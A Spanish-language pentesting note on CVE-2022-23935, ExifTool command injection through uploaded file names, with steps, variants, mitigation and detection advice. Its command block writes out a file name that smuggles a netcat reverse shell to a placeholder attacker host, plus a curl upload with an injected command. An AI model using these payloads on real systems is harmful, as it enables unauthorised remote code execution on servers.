---
topic: ExifTool — inyección por nombre de archivo (CVE-2022-23935)
tags: [linux, exiftool, command-injection, upload, cve-2022-23935]
---

# ExifTool — inyección por nombre de archivo (CVE-2022-23935)

[🌐 English](exiftool-filename-injection.en.md) | **Español**

## Concepto

ExifTool anterior a 12.38 no neutraliza correctamente ciertos nombres de archivo al construir una operación interna. Un nombre con metacaracteres puede ejecutar un comando cuando la aplicación procesa la imagen. El fallo no está en los metadatos, sino en el nombre que se pasa a la herramienta.

## Cuándo aplica

- La web sube imágenes y ejecuta ExifTool para generar reportes o miniaturas.
- El nombre original del archivo se conserva y se pasa a la herramienta.
- La versión es anterior a 12.38 o no se ha revisado el wrapper.

## Procedimiento

1. Confirmar la versión con la respuesta, el informe o el binario.
2. Subir una imagen válida con un nombre que contenga el separador y el comando.
3. Escuchar en el puerto elegido y comprobar la ejecución.
4. Repetir con una reverse shell si el comando simple funciona.

## Comandos

```bash
cp foto.jpg 'foto.jpg; busybox nc <IP> <PORT> -e sh'
curl -F 'image=@foto.jpg;filename=foto.jpg;id' http://<HOST>/upload
# Verificar la versión
curl -s http://<HOST>/report | grep -i exiftool
```

## Variantes

- Inyectar en un nombre con salto de línea si el wrapper usa una lista de argumentos.
- Aprovechar una ruta de guardado derivada del nombre.
- Combinar con una subida que permita elegir el nombre final.

## Limitaciones

- La versión corregida (12.38+) neutraliza el nombre.
- La aplicación puede renombrar el archivo antes de llamar a ExifTool.
- El contenedor puede no tener las herramientas necesarias para la reverse shell.

## Mitigación

- Actualizar ExifTool y usar `--` o una lista de argumentos sin shell.
- Renombrar los archivos a un UUID y validar el MIME real.
- Ejecutar el procesamiento en un sandbox sin red saliente.

## Detección

- Nombres de archivo con `;`, `|`, `$()` o saltos de línea.
- Procesos hijos de la web que lanzan shells o `nc`.
- Versiones antiguas de ExifTool en los informes.

## Referencias

- [0xdf — Investigation](https://0xdf.gitlab.io/2023/04/22/htb-investigation.html)
- [NVD — CVE-2022-23935](https://nvd.nist.gov/vuln/detail/CVE-2022-23935)
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
